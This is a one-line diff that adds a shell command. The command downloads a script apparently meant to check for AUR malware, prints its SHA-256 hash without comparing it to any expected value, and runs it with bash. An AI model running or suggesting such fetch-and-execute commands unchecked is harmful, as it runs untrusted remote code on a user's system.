@@ -1,0 +1,1 @@
+curl -sSf https://raw.githubusercontent.com/A1RM4X/AUR-Malware-2026.06-Check/main/check-aur-vuln.sh -o /tmp/check-aur-vuln.sh && sha256sum /tmp/check-aur-vuln.sh && bash /tmp/check-aur-vuln.sh
